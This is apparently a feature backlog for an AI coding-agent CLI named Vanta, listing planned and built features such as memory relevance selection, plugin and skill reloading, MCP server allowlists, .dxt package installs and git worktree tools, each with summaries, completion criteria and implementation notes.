No binding system exists to add chord sequences / ~/.claude/keybindings.json hot-reload to. Parked unless a binding registry returns.

items.title: Memory relevance via Sonnet side-query — LLM-selected memory files per turn
items.summary: Each turn, another agent scans memory-file headers (frontmatter name+description only), then fires a dedicated Sonnet side-query to pick up to 5 most-relevant files for the current user query. Excludes API/usage docs for tools already in use. Returns file paths + mtime for staleness annotation.
items.done: Only relevant memory files are loaded per turn (not all memories); recently-used tool docs excluded from selection; up to 5 files selected; selection logged for debugging.
items.notes: Pure/injectable buildRelevancePrompt (side-query: file names+summaries + turn -> JSON array of relevant names) + parseRelevanceSelection (tolerant: strips json fences, extracts [...] amid prose, keeps only valid names dropping hallucinated, dedup, [] on garbage) + relevanceEnabled (VANTA_MEM_RELEVANCE=1, default off) + selectRelevantMemories (injected cheap-model complete; enabled+ok+non-empty -> selection else fallback; never throws). Cheap-model aux pattern (mirrors vision). APPENDED to the existing relevance.ts (durable-write classifier) preserving its exports per never-clobber. Built+tested; wire = prepare-helpers loadPromptContext narrows per-goal memory via a cheap provider (named). Default off = current load-all.

items.title: Session backgrounding — Ctrl+B to background/foreground running queries
items.summary: Ctrl+B backgrounds the current in-progress query into a background task, freeing the TUI for a new query. Foreground a running background task and sync its messages back. Enables multi-query session management without cancelling work in flight.
items.done: Ctrl+B while a query is running moves it to background; user can continue chatting; /tasks or the task panel shows background task progress; foreground a task to see its messages.

items.title: In-TUI next-prompt suggestions — tappable predicted prompts after each turn
items.summary: After each model response, another agent generates 3 predicted next prompts via a forked side-query and shows them as tappable options below the input. Controlled by `promptSuggestionsEnabled` setting. Disabled in swarm/teammate mode and non-interactive sessions.
items.done: 3 suggested prompts appear after a model response; selecting one submits it; suggestions update per turn; disabling in settings removes them.

items.title: Auto-dream — periodic background memory consolidation across sessions
items.summary: Background service that consolidates memories across sessions via forked agent. Fires when: time since last consolidation >= minHours AND session count >= minSessions. File-based lock prevents parallel runs. Made visible in task list as DreamTask (phase: starting/updating, files touched, turn summaries).
items.done: After accumulating sessions, auto-dream fires; progress visible in footer pill; lock prevents duplicate runs; files touched tracked; consolidation updates MEMORY.md.
items.notes: Pure/injectable DreamState{lastDreamMs,memoriesSinceLastDream} + shouldDream (enabled AND interval-elapsed AND >= minNewMemories) + resolveDreamConfig (VANTA_AUTO_DREAM=1, VANTA_DREAM_INTERVAL_MS 6h, VANTA_DREAM_MIN_MEMORIES 10; default DISABLED) + recordDream (stamp+reset) + recordNewMemories (accumulate) + runDreamIfDue (injected getState/saveState/now/consolidate; runs + records when due, best-effort consolidate throw -> no state change never throws dreamed:false). Mirrors proactive policy. consolidate typed ()=>Promise<unknown> so brain/consolidate plugs in at the wire without importing it. Built+tested; gateway-tick/cron wire named (persisted .vanta/dream.json). Disabled/not-due = nothing.

items.title: Detailed session cost tracker — per-model usage, cache tokens, tool+API duration, lines changed
items.summary: another agent tracks: total cost USD, per-model token usage, API duration (with/without retries), tool duration, cache creation/read tokens, web search request count, lines added/removed, unknown-model cost flag. All aggregated per-session and per-turn for the cost footer and /stats display.
items.done: Session end shows total cost, model breakdown, cache efficiency, API vs tool time split, lines changed; /stats shows all counters; reset on /clear.
items.notes: Pure/immutable ModelUsage + CostDetail{byModel,linesChanged,toolMs} + emptyCostDetail/addTurnUsage (per-model accumulate: same model sums, different separate; cache/api default 0)/addLinesChanged/addToolMs/modelCostUsd (reuses estimateCostUsd; cache display-only)/formatCostDetail (per-model line + totals; sorted by input desc; unpriced -> ~?; empty -> no usage yet). Never mutates input. Built+tested; wire = turn-loop addTurnUsage with provider usage + dispatchTool lines/toolMs + /usage formatCostDetail beside buildUsageView (named).

items.title: Agentic session search — LLM-powered semantic search across past sessions
items.summary: The /resume picker uses agenticSessionSearch to find relevant sessions by content, not just title. Scans up to 2000 chars of transcript per session (max 100 sessions), then side-queries a small/fast model to rank sessions by relevance to the search query.
items.done: Typing a search term in the resume picker finds sessions by content (not just name); LLM ranks results by relevance; limited to 100 sessions to stay fast.
items.notes: Pure/injectable buildSessionSearchPrompt (query + candidate id/title/preview -> JSON [{id,why}]) + parseSessionSearchResult (tolerant: strips fences/prose, keeps only valid ids dropping hallucinated, dedup, cap 8, [] on garbage) + lexicalSessionSearch (fallback, reuses recall weighted-token ranker, title 3/preview 1) + searchSessions (injected cheap complete; agentic only when enabled+ok+>=1 valid match else lexical; never throws). Reuses buildSessionPreview. Built+tested; wire = vanta sessions search <q> builds candidates from listSessions+preview + cheap provider (named). Fallback always returns something.

items.title: WaitForMcpServers tool — block until MCP connections are ready
items.summary: another agent exposes WaitForMcpServers so an agent can block at session start until all pending MCP server connections resolve, instead of racing or silently missing tools. Vanta currently has no readiness barrier for MCP mounts.
items.done: `wait_for_mcp_servers` blocks until all configured MCP servers are connected (or timeout), then returns a per-server status map.
items.notes: Pure/injectable allReady (required subset or all non-disabled == connected; reuses McpServerStatus; no servers -> true) + waitForMcpReady (injected getStatuses/sleep/now, polls until allReady or timeout 30s; ready-on-first-poll waitedMs:0; a getStatuses throw -> not-ready snapshot {statuses,failed} so a failed read is NEVER treated as ready; returns {ready,waitedMs,statuses,timedOut}) + formatWaitResult (✓ N ready in 1.2s / ⚠ timed out — laggards). Built+tested; wire = a wait_for_mcp_servers tool / run host injects live getStatuses + real sleep/now (named, not registered).

items.title: /reload-plugins — activate plugins installed during the current session
items.summary: another agent's `/reload-plugins` activates any plugins installed since session start without requiring a restart. If you `vanta plugin install` during a session, the new plugin isn't active until `/reload-plugins` or restart. Vanta has no in-session plugin reload.
items.done: `/reload-plugins` re-scans the plugin directory, loads any newly installed plugins, and prints a diff of what was added; existing plugins are not re-initialized.
items.notes: WIRED /reload-plugins: pure planPluginReload (enabled-but-not-loaded -> toLoad, intersection -> alreadyLoaded; dedupe, stable) + formatReloadResult (↻ N new — loaded / no new plugins) + runReloadPlugins (injectable). Handler reads settings.plugins.enabled fresh + pluginCommands.loadedPlugins() (new read-only accessor), and on a non-empty toLoad calls loadEnabledPlugins for the subset — each plugin tool stays kernel-gated (describeForSafety) exactly as a startup load. Registered in catalog+handlers (170). v0 limit: loaded set derived from registered commands (injectable, tightenable).

items.title: Plugin install hints via <claude-code-hint> — stderr-driven plugin prompts
items.summary: CLIs and SDKs emit `<claude-code-hint plugin='slug' />` tags to stderr. another agent intercepts, deduplicates (show-once per plugin ever), and surfaces a one-time notification to install the plugin from the marketplace. Shown/dismissed state recorded in config.
items.done: Running a tool that emits a hint tag shows a one-time install prompt; dismissing or installing prevents re-prompt; disabling hint recommendations suppresses all future hints.
items.notes: Pure parsePluginHints (type==plugin hints from the reused vanta-hints parser, control-stripped, unsafe dropped) + buildPluginSuggestion (💡 suggest + the install command; SAFE_PLUGIN_NAME /^[a-zA-Z0-9][a-zA-Z0-9_-]{0,63}$/ so a hostile name with shell metachars/path/substitution CANT become a runnable injection -> null) + pluginHintSuggestions (deduped) + pluginSuggestionsFromText. Never auto-installs. Reuses vanta-hints (claude-code-hint interop alias inherited, not re-declared). Built+tested; dispatch wire = shell-cmd parseVantaHints stderr already parses hints, surface plugin suggestions there (named). FOLLOW-UP: card copy says vanta plugins add but the real CLI is vanta plugin install <path> — reconcile the operator copy when wiring (its a never-executed hint).

items.title: Skill companion files — bundled assets extracted to disk on first use
items.summary: Skills can declare `files: Record<string, string>` of companion text assets. On first invocation another agent extracts them to a per-skill base directory and prepends a 'Base directory: <dir>' line to the prompt so the model can Read/Grep them on demand.
items.done: Skill with declared files extracts them on first run; subsequent runs find them already present; model can reference them by path without knowing the extraction location.
items.notes: Pure/injectable listSkillAssets (all non-SKILL.md entries, traversal-safe via isSafeAssetName) + planAssetExtraction (assets missing from dest, idempotent skip-if-present) + extractSkillAssets (injected listSrc/listDest/copy, best-effort never throws, returns extracted names). SECURITY: rejects ../nested/absolute/:-bearing names in list AND plan. No companion files -> nothing extracted. Built+tested; wire = library installOne after writing SKILL.md + first-use readSkill/loadBody lazy extract (named).

items.title: allowedTools + disableModelInvocation in skill frontmatter
items.summary: Skills can restrict their tool palette via `allowedTools: string[]` in frontmatter. `disableModelInvocation: true` makes a pure-tool skill that executes its tool list without an LLM turn. Pairs with hooks and agent fields to compose complex skill behaviors.
items.done: Skills with allowedTools only expose those tools during execution; skills with disableModelInvocation run tool calls without an LLM round-trip; /doctor reports invalid tool names.
items.notes: Pure parseSkillToolPolicy (reads RAW frontmatter not closed SkillMeta; allowedTools array + disableModelInvocation bool/yaml-string; absent/garbage -> unrestricted, empty array = no tools meaningful) + skillAllowedToolNames (present ∩ allowedTools else all, never grants absent, mirrors agentToolFilter) + isModelInvocable (!disableModelInvocation). Kernel still gates. Built+tested; wires = skills/select drops non-invocable from the model index + active-skill tool scope via buildRegistry exclude (named). Neither field = unchanged.

items.title: Plugins can ship LSP server configs — auto-mount language servers
items.summary: A plugin can declare LSP server configurations in its manifest. another agent reads the lsp/ directory from the plugin package, validates the config schema, and mounts the LSP server automatically when the plugin is enabled.
items.done: Installing a plugin that includes an LSP server config makes that language server available; another agent's LSP manager mounts it; /doctor shows the LSP server status.
items.notes: Pure PluginLspConfig{language,command[],extensions[]} + parsePluginLsp (reads .lsp off the raw manifest since the strict schema rejects unknown keys; tolerant, zod-validates each, drops invalid) + resolveLspServers -> {configs,clashes} (dedupe by lowercased language first-wins, clash reported not silent, invalid-command dropped) + lspForExtension (ext normalized with/without dot, case-insensitive). SECURITY: only RESOLVES configs — the spawn is the boundary + still kernel-gated (assess) like any plugin capability. Built+tested; loader.ts loadEnabledPlugins + lsp-mount spawn wire named.

items.title: /init-verifiers — create project-specific verifier skills
items.summary: Bundled /init-verifiers command: analyzes the project and creates one or more verifier skill files that the Verify agent can use to automatically check code changes. Supports multiple verifiers for different subsystems (API + web UI). Progress tracked via TodoWrite.
items.done: Running /init-verifiers creates appropriate verifier skill files; multiple verifiers generated for multi-subsystem projects; output tracked with todos.
items.notes: WIRED /init-verifiers: pure detectVerifierCommands (package.json scripts test/build/lint/typecheck -> npm run; Cargo.toml -> cargo test/build; Makefile targets -> make; dedupe by kind, package.json wins; tolerant) + buildVerifierSkill (serializeSkill, name verify-<kind>, body referencing the EXACT command + exit-0 pass criterion) + verifierSkills + runInitVerifiers (injected reader). SECURITY: only emits commands DETECTED from the project config, no synthesized shell. No commands -> generic verifier note. Handler read-only, returns summary; the SKILL.md write delegated to write_skill (boundary). Registered (171 lines).

items.title: Skill usage tracking — 7-day half-life ranking by usage count + recency
items.summary: Records usageCount and lastUsedAt per skill invocation (debounced 60s to avoid write spam). Persisted in globalConfig. Ranking uses a 7-day half-life decay. Skills used more recently and more often rank higher in the skill picker and @-completions.
items.done: Frequently-used skills appear first in completions; recently-used skills surface above rarely-used ones; usage decays over time (7-day half-life).
items.notes: Pure decayWeight (0.5**(age/halfLife), 7-day half-life: age0->1, 7d->0.5, 14d->0.25, neg age->1) + usageScore (summed decayed weight per skill) + rankSkillsByUsage (score desc, alpha tie-break, no-usage skills trail alphabetical, no-usage-anywhere -> existing alphabetical) + topUsedSkills(n=5). Recent-heavy beats old-heavy at equal counts. nowMs injected. Built+tested; wire = skills/select.ts orders the SkillIndexEntry[] via rankSkillsByUsage before prompt skillsTier (named). No usage = stable order.

items.title: Conditional skill activation on file edit — skills auto-load for matched paths
items.summary: When FileEditTool writes a file, another agent calls `activateConditionalSkillsForPaths` and `discoverSkillDirsForPaths` to automatically activate any skills that declare a path match for the edited file. Skills can conditionally register themselves when specific files are touched, enabling project-aware tool sets.
items.done: Editing a file in a directory with a matching skill definition triggers that skill to activate for subsequent calls in the session.
items.notes: Pure parseActivateGlobs (raw frontmatter activateOn array, tolerant) + matchGlob (self-contained anchored glob: **/ and /** span segments, bare * within a segment, ? one non-/ char, literal exact, case-sensitive; all regex-special escaped = no injection) + pathActivates + skillsForEditedPath ({name,globs}[] -> matched names deduped stable). Absent activateOn = never path-activated. Built+tested; wires = dispatchTool write/read path -> skillsForEditedPath + skills/select unions the matches (named).

items.title: Official MCP registry — prefetch Anthropic's server registry for trust lookups
items.summary: another agent fire-and-forget prefetches the official Anthropic MCP registry at startup. This populates a URL set used to identify whether a connected MCP server is 'official' (from Anthropic's registry) vs. third-party. Used to show trust indicators in the MCP connection UI and to gate certain behaviors on official servers.
items.done: MCP connection list shows an 'official' badge for servers from `api.anthropic.com/mcp-registry`. Trust lookup is instant (in-memory Set after prefetch).
items.notes: Pure/injectable parseRegistry (tolerant [entry]|{servers:[]}, zod-validated, [] on garbage, bad rows dropped) + lookupServer (name case-insensitive then command/package substring, null) + serverTrustSignal (official=canonical source | known | unknown) + fetchOfficialRegistry (cache-first, injected fetchJson, failure -> cached/[] never throws). SIGNAL NOT AUTH — being in the registry only adds a display label; resolveMcpTrust (operator confirm) + kernel assess() still gate. Built+tested; wire = mount mountOneServer before resolveMcpTrust passes the signal to the trust dialog badge (named). Live fetch = boundary.

items.title: Plugin recommendation engine — proactive install suggestions for LSP and hint plugins
items.summary: another agent has a `usePluginRecommendationBase` shared state machine that powers proactive plugin install recommendations. Sources include: LSP server plugins (for detected file types) and claude-code-hint plugins (from skill frontmatter). The machine handles gates (remote mode, already-showing, in-flight), async resolution, and shows success/failure notifications. Users can install from the suggestion.
items.done: Opening a `.py` file when no Python LSP is installed shows a 'Install pylsp plugin?' suggestion. Accepting installs and activates it.
items.notes: Pure LANGUAGE_PLUGIN_MAP (.rs/.py/.go/.ts.. -> LSP plugin) + recommendPlugins (3 lanes: hint plugin score 100 explicit > failing-capability 50 > language LSP scored by summed ext count over threshold 3; dedupe by plugin keeping highest score; sort score-desc; cap 5) + formatRecommendations (reuses buildPluginSuggestion + reason). Unsafe names dropped (reuses isSafePluginName). Never auto-installs. Proactive analogue of plugin-hints. Built+tested; signal-gather wire = prepareRun scans file-ext/hints/failures -> recommendPlugins (named). Inherits the plugins-add->plugin-install copy reconcile.

items.title: Plugin auto-update — background marketplace and plugin update check on startup
items.summary: another agent calls `autoUpdateMarketplacesAndPluginsInBackground()` during startup housekeeping. Official marketplaces with `autoUpdate: true` are refreshed automatically. Plugin updates are downloaded in the background without blocking the session start.
items.done: On next launch after a plugin update is released, the update is applied silently. A notification appears if a restart is needed.
items.notes: Pure/injectable findPluginUpdates (reuses compareSemver from update/version-check; only strictly-newer latest -> {name,installed,latest}; malformed version never falsely flagged) + buildPluginUpdateNotice (↑ N updates: name i->l — run vanta plugins update / when none) + pluginUpdateEnabled (VANTA_PLUGIN_UPDATE_CHECK default off) + checkPluginUpdates (injected installed+fetchAvailable, fetch throw -> [] never throws, NEVER auto-updates). Plugin analogue of the CLI auto-updater. Built+tested; startup wire = prepareRun when enabled surfaces the notice (named; live fetch = marketplace boundary). No updates/disabled = nothing.

items.title: `/reload-skills` — re-scan skill directories without restarting the session
items.summary: another agent (v2.1.152) adds `/reload-skills` to re-scan `~/.claude/skills/` and plugin skill dirs in-session. A `SessionStart` hook can also return `reloadSkills: true` to auto-reload after installing new skills.
items.done: After a hook installs a new skill, `/reload-skills` makes it available immediately. No session restart needed.
items.notes: WIRED /reload-skills: pure planSkillReload (on-disk-not-indexed=added, indexed-not-on-disk=removed, intersection=unchanged; dedupe, stable) + formatSkillReload (↻ N new · M removed · K unchanged / no skill changes) + runReloadSkills (injected readOnDisk/readIndexed/reindex). Handler reads on-disk via injected listSkills; session-indexed baseline per-session via a WeakMap keyed on ctx.setup; reindex advances the baseline. Mirrors reload-plugins. Registered (172).

items.title: Plugin `bin/` executables — plugins ship binaries invocable from Bash tool
items.summary: another agent (v2.1.91) allows plugins to ship executables under `bin/`. These are added to the PATH for Bash tool subprocesses, so agents can call plugin-provided tools as bare commands without absolute paths.
items.done: A plugin ships `bin/my-tool`. The agent calls `my-tool --flag` in Bash without knowing the install path.
items.notes: Pure/injectable resolvePluginBinDirs (existing <pluginDir>/bin dirs, join under plugin dir + isInside guard so no ../absolute escape; injected exists) + buildPluginPath (bins prepended to basePath, drop empties, dedupe first-wins, path.delimiter) + pluginPathEnv (PATH overlay bins ahead of env.PATH, {} when none = unchanged). SECURITY: only a plugins OWN bin, traversal-guarded; PATH exposure is NOT escalation — the spawned command STILL kernel-gated via assess. Built+tested; wire = shell-cmd childRunOpts merges pluginPathEnv where applySessionEnv merges (named). No bins = unchanged PATH.

items.title: MCP `alwaysLoad` option — skip tool-search deferral for trusted servers
items.summary: another agent (v2.1.121) adds `alwaysLoad: true` to MCP server config. All tools from that server are loaded immediately at startup instead of waiting for a tool-search lookup. Useful for MCP servers with a small, always-relevant tool set.
items.done: A high-frequency MCP server configured with `alwaysLoad: true` has its tools available from message 1, without a ToolSearch call first.
items.notes: Pure parseAlwaysLoadServers (tolerant: servers+mcpServers maps, only literal alwaysLoad:true, [] on garbage, never throws) + isAlwaysLoadTool (prefix-match mcp_<slug(server)>_ mirroring mount.ts toolName slugify; trailing _ blocks foo/foobar overlap; false for deferred/non-mcp) + alwaysLoadToolNames (always-load subset). Always-load = SCHEMA EXPOSURE only — kernel still gates every call. Built+tested; wire = tool-scope scopeToolSchemas unions alwaysLoadToolNames into wanted before the filter (named). Absent/false = deferred as today.

items.title: MCP result `maxResultSizeChars` — allow up to 500K chars via `_meta` annotation
items.summary: another agent (v2.1.91) adds MCP tool result persistence via `_meta['anthropic/maxResultSizeChars']` annotation (up to 500K chars). MCP tools can annotate their results to persist large outputs — e.g. database exports, full file reads — beyond the default truncation limit.
items.done: An MCP tool returning a 200K-char result with `_meta['anthropic/maxResultSizeChars']: 300000` has the full result persisted and available to the model.
items.notes: Pure parseMaxResultSize (_meta.maxResultSizeChars then _meta[vanta/maxResultSizeChars]; clamp [DEFAULT 20k, HARD_CAP 500k]; below default floors, above cap clamps, absent/garbage/<=0/non-object -> default) + applyResultSizeLimit (head+tail+marker <= maxChars, mirrors bash-output-limit) + resolveResultLimit (over result._meta). SECURITY: 500k HARD ceiling — a result can request more but never force unbounded memory. Built+tested; wire = mount mcpToolToVantaTool/rich-output uses resolveResultLimit + applyResultSizeLimit instead of the fixed default (named). No annotation = default.

items.title: `skillOverrides` setting — control per-skill visibility to model and menu
items.summary: another agent (v2.1.129) makes `skillOverrides` work: `off` hides a skill from both the model and `/`-menu; `user-invocable-only` hides from model but keeps it in the menu; `name-only` collapses the description to save context tokens.
items.done: Setting `skillOverrides: {my-verbose-skill: 'name-only'}` keeps the skill available but strips its description from the system prompt.
items.notes: SkillOverridesSchema (record name -> {disabled?,hiddenFromModel?,hiddenFromMenu?}) added to settings; pure resolveSkillOverride + skillVisibleToModel (false when disabled||hiddenFromModel) + skillVisibleInMenu (false when disabled||hiddenFromMenu) + filterModelSkills (order-preserving). disabled = off switch (hides both); explicit false keeps visible; absent = visible to both (current behavior). Operator-side analogue of the frontmatter disableModelInvocation (tool-policy). Built+tested; wire = skills/select filterModelSkills before ranking + /skills menu gates skillVisibleInMenu (named).

items.title: Skill `\$` escape — include literal `$` before a digit in skill command bodies
items.summary: another agent (v2.1.163) adds `\$` escape syntax in skill command bodies to include a literal `$` before a digit. Without escaping, `$1` is interpreted as a command argument placeholder.
items.done: A skill with `command: 'echo \$1.00'` outputs the literal string `$1.00` instead of substituting argument 1.
items.notes: Pure single-pass expandArgs (body,args): $1..$9 -> args[0..8], $ARGUMENTS -> join, escape by preceding-backslash PARITY (odd = literal $1, even = substitute; \$1 = backslash+arg). $ alone / $x non-digit left as-is. Out-of-range/$0 -> empty (shell-collapse choice). One combined regex pass so an escape cant double-process + a substituted arg containing $2 isnt re-scanned. Generalizes the existing frontmatter expandSkillArgs ($ARGUMENTS-only, also unwired). Built+tested; wire = skill/slash run-path body expansion calls expandArgs (named). No $ = unchanged.

items.title: MCP allowlist/denylist settings — per-session server access control
items.summary: another agent settings: allowedMcpServers (allowlist by name/glob), deniedMcpServers (denylist), enableAllProjectMcpServers (auto-approve project-level .mcp.json servers), enabledMcpjsonServers / disabledMcpjsonServers (per-server overrides). Vanta mounts all configured servers without granular per-session control.
items.done: allowedMcpServers and deniedMcpServers gate which servers are mounted at session start; enableAllProjectMcpServers auto-approves .mcp.json servers; the per-server overrides take effect without prompts.
items.notes: McpAccessSchema {allow?,deny?} added to settings; pure serverAccessDecision (deny match -> deny even if allowed = deny wins; allowlist present + not listed -> deny; blank allowlist = no allowlist; neither set -> allow all = current behavior) + filterMountableServers (preserves order). Adds an operator gate atop the MCP trust dialog + kernel assess. Mirrors network-deny. Built+tested; mount filter wire = mountMcpServers wraps Object.keys(config.servers) with filterMountableServers(names, settings.mcp) (named). Absent = all mount.

items.title: Skill context budget + management settings parity
items.summary: another agent settings: skillListingBudgetFraction (max context fraction for skill index, default 0.01), maxSkillDescriptionChars (per-skill description limit), disableBundledSkills (turn off shipped skills), disableSkillShellExecution (block shell exec in skills), skillOverrides (per-skill visibility), disableWorkflows (disable dynamic workflows). Vanta clips skill descriptions (PROMPT-STABILITY) but lacks the full settings layer.
items.done: All listed skill settings are in the schema and enforced at skill-index build time; disableWorkflows gates the Workflow tool; skillOverrides accepts a name→mode map.
items.notes: SkillSettingsSchema {contextBudgetTokens?,maxSkills?,descriptionMaxChars?} added to settings; pure clipSkillDescription (default 100 = matches trimSkillDesc exactly, asserted) + applySkillBudget (cap maxSkills head-slice keeping highest-ranked, clip descs, drop lowest-ranked from tail until estTokens<=budget keeping >=1). Absent = current behavior (all skills, 100-char clip, byte-identical). Built+tested; wire = skill-selection calls applySkillBudget(ranked, settings.skills) before prompt skillsTier + skillsTier uses clipSkillDescription (named).

items.title: /skillify — capture current session as a reusable skill
items.summary: Bundled /skillify skill that reads session memory + user messages, then generates a new skill file (frontmatter + prompt) encoding the session's repeatable process. User describes the skill name; the model produces a ready-to-commit skill file.
items.done: Running /skillify after a session produces a valid skill .md file with frontmatter and a prompt that recreates the session's workflow; the file is saved to the skills directory.
items.notes: WIRED /skillify [name]: pure distillSkillDraft ({name?,firstUserGoal?,toolSequence,keyActions?} -> {name (arg slug / goal slug / unnamed-skill), description (one-line goal), body (## Goal + ## Procedure numbered ordered DISTINCT steps, dedupeConsecutive, control-stripped)}) + buildSkillifyContent (serializeSkill, round-trips through parseSkill). Handler reads goal (firstUserGoal/lastIntent) + tool sequence from ctx.convo.messages, returns the draft preview + a note to use write_skill — NO auto-write/FS. Empty session -> minimal draft + nothing-to-skillify note. Registered (173 lines).

items.title: MCP elicitation — in-session user input prompts from MCP servers (2025-11-05 spec)
items.summary: Handles MCP `elicitation/create` requests from servers. Two modes: form (surfaces a dialog for user text input during tool execution) and url (opens browser URL, waits for completion notification via `notifications/elicitationComplete`). Pre/post hooks. Part of MCP 2025-11-05 spec.
items.done: MCP tool calling elicitation/create surfaces a dialog; user submits input; server receives the response; url mode opens browser; completion notification resolves the elicitation.
items.notes: Pure parseElicitationRequest (params.message + requestedSchema.properties/required -> {message,fields[type string|number|boolean,required]}; tolerant -> [] fields) + buildElicitationPrompt (message + numbered field list, full-ANSI-stripped 500-cap) + validateElicitationResponse (coerce by type; valid -> accept+content; missing/unparseable REQUIRED -> decline; absent optional omitted, never auto-filled) + elicitationCancel (current default shape). SECURITY: server text UNTRUSTED, control-stripped; never auto-fills/executes — only collects operator-typed input. Built+tested; wire = events.ts onElicitation parses -> injected prompter -> validate instead of always-cancel; empty schema/decline -> cancel (named). Delta over the existing always-cancel onElicitation.

items.title: .dxt extension packages — single-file MCP server installer
items.summary: `.dxt` file format (from `@anthropic-ai/mcpb`) packages an MCP server manifest + assets into a single installable file. `claude install <path>.dxt` validates the manifest and configures the MCP server. Enables one-click MCP server installation from file or URL.
items.done: Installing a .dxt file validates the manifest, mounts the MCP server in settings, and makes its tools available in the next session; invalid manifests are rejected with field-level errors.
items.notes: Pure/injectable parseDxtManifest (zod name+server.command; non-object/missing-command/garbage -> {error} never throws) + dxtToMcpServerEntry ({command,args,env,cwd:installDir} = mount ServerSchema shape) + buildDxtInstallPlan ({installDir under extensionsDir/<sanitized name>, serverName, mcpEntry, steps}). SECURITY: sanitizeDxtName (slug, ../../evil->evil, traversal rejected) so installDir cant escape; install != trust — the installed server STILL goes through resolveMcpTrust + kernel assess on mount. Built+tested; install point = vanta mcp install <file.dxt> unzips into installDir + writes mcpEntry to .mcp.json (named boundary, mirrors desktop-import). Malformed = error no install.

items.title: Plugin marketplace — multi-source plugin registry with local cache
items.summary: Marketplace manager supports multiple sources (URL, GitHub repo, npm package, local file). Manifests are cached in ~/.claude/plugins/marketplaces/ for offline access. `known_marketplaces.json` tracks all configured sources. Used by /plugin UI to browse and install from any source.
items.done: User can add a marketplace URL; manifest downloads and caches; /plugin shows marketplace entries; GitHub repo marketplaces are cloned; offline installs use cache.
items.notes: Pure/injectable parseMarketplaceSource (tolerant array|{plugins:[]}, zod-validated, stamped with source, unsafe names rejected via reused isSafePluginName, [] on garbage) + mergeCatalogs (dedupe by name case-insensitive first-source-wins, returns {plugins,clashes}) + searchMarketplace (name-startsWith>name-contains>desc-contains, cap 20) + fetchMarketplace (cache-first PER source, a source failure -> its cache/[] skipped never throws, no sources -> empty). SECURITY: source UNTRUSTED — entries validated, listing != trusting (an install still goes through plugin trust + kernel gate). Built+tested; wire = vanta plugins browse/search builds deps from configured registry URLs + .vanta cache (named, live fetch boundary).

items.title: .claude/agents/ — custom agent definitions from markdown files
items.summary: Load custom agent definitions from .claude/agents/*.md. Frontmatter declares effort, allowed tools, MCP servers, tool filters, description. Like skills but specifically for spawning as named sub-agents via @AgentType mention in prompts.
items.done: Files in .claude/agents/ appear in @-completions and can be spawned as named sub-agents; frontmatter fields (effort, tools, description) parsed and applied.
items.notes: Pure/injectable CustomAgentDef{name,description,allowTools?,model?,systemPrompt} + parseAgentDef (frontmatter name/desc/tools/model + body->systemPrompt; tolerant: missing name->slug, missing tools->unrestricted, empty body->minimal) + listAgentDefs (.claude/agents + ~/.vanta/agents via injected reader, project wins) + resolveAgentType (custom by name case-insensitive wins over same-named built-in; built-in-only -> built-in; unknown -> general-purpose; reuses resolveBuiltinAgent). SECURITY: allowTools only narrows; tools/prompt still kernel-gated — cant grant a blocked tool. Built+tested; wire = delegate runDelegate loads defs + resolveAgentType -> exclude+persona+model (named). No files = built-ins only.

items.title: Auto skill improvement — periodic LLM review of invoked skills from session turns
items.summary: Post-sampling hook fires every N turns to review which skills were invoked, compares against recent messages with a small/fast model, and generates targeted skill updates (section, change, reason). Improves skills organically from actual usage patterns without disrupting the main flow.
items.done: After N turns with skill invocations, skill content is automatically refined; updates scoped to specific sections; uses a small/fast model to minimize cost; non-blocking.
items.notes: Pure/injectable shouldImproveSkill (invoked this turn AND VANTA_SKILL_IMPROVE=1, default OFF) + buildImprovementPrompt (skill body + turn performance -> improved body or no-change sentinel) + parseImprovement (no change/empty/identical -> {improved:false, original verbatim}; different -> {improved:true, body fence-stripped, note}) + proposeSkillImprovement (injected complete; throw -> no-change never throws; NEVER writes). PROPOSAL ONLY — operator/curator gates the overwrite (curator stays non-destructive). Mirrors background-review gating. Built+tested; wire = reviewTurn surfaces the proposal for approval via write_skill (named). Disabled/not-invoked = nothing.

items.title: Plugin dependency resolution — apt-style presence guarantees with cycle detection
items.summary: Plugins can declare dependencies on other plugins. Resolution: DFS walk at install time with cycle detection; load-time `verifyAndDemote` demotes plugins with unsatisfied deps (session-local, no settings write). Cross-marketplace deps blocked. Bare dep names inherit declaring plugin's marketplace.
items.done: Installing plugin A with dep on B installs B first; circular deps rejected at install time; if B is removed, A is demoted (not errored) at load time.
items.notes: Pure parsePluginDeps (reads dependsOn off the RAW manifest like lsp-config since the strict schema drops unknown keys; tolerant non-array/absent/non-object -> [], drops non-strings/blanks, trims, dedupe first-wins, DROPS self-refs) + PluginNode{name,dependsOn} + resolveLoadOrder ({ok,order}|{ok:false,kind:missing|cycle,detail}) + missingDeps + detectCycle. ALGO: Kahn topo sort (indegree over present-node edges; ready nodes emitted in INPUT order so no-deps preserves original order + stable ties) + DFS grey-set cycle detection (returns the closed cycle path; self-cycle a->a). Missing checked BEFORE cycle. All errors-as-values — never throws (explicit no-throw tests). Tested: chain A->B->C=>C,B,A, diamond, multi-root, no-deps, missing, two-node + self cycle, missing-precedes-cycle, empty + parse tolerance. Built+tested; wire = loader loadEnabledPlugins parsePluginDeps per plugin -> resolveLoadOrder -> load in order, REFUSE on {ok:false} (named). No deps = original order.

items.title: MonitorMcpTask — background MCP monitoring task (MONITOR_TOOL gate)
items.summary: MonitorMcpTask is a background task type for monitoring MCP server output. Gated behind MONITOR_TOOL feature flag. Enables the Monitor tool to run background MCP watchers that fire callbacks when conditions are met.
items.done: A Monitor tool call creates a MonitorMcpTask running in the background; task visible in footer; fires callback on condition; cancellable.

items.title: Swarm idle notification — teammate sends idle state to leader on Stop
items.summary: When a teammate agent's session stops, another agent's `teammateInit` module fires a Stop hook that writes an idle notification to the team leader's mailbox. The leader polls the mailbox and updates the teammate's status in the team UI (showing it as idle rather than running). Includes the last peer-DM summary for context.
items.done: When a worker completes its task, the leader's team view shows the worker as 'idle'. The leader can assign new work or clean up the team.

items.title: LocalWorkflowTask — workflow script task type (WORKFLOW_SCRIPTS gate)
items.summary: LocalWorkflowTask is a task type that runs a workflow script (multi-agent orchestration). Gated behind the WORKFLOW_SCRIPTS feature flag. Enables the Workflow tool to spawn structured multi-step agent workflows tracked in the task list.
items.done: Running a workflow script creates a LocalWorkflowTask visible in the task list; progress tracked; workflow completion shows results.

items.title: Git worktree tool — isolated branch workspaces
items.summary: another agent has EnterWorktreeTool/ExitWorktreeTool: create a git worktree for isolated parallel work (each agent gets its own branch+directory, auto-cleaned if unchanged). Useful for multi-agent builds where agents edit different files concurrently without conflicts. Add enter_worktree / exit_worktree tools, kernel-gated (creates a new git scope).
items.done: `enter_worktree` / `exit_worktree` let the agent work in an isolated git worktree; auto-cleanup on exit.

items.title: Bash auto-classifier — ML-based auto-approval for safe bash commands
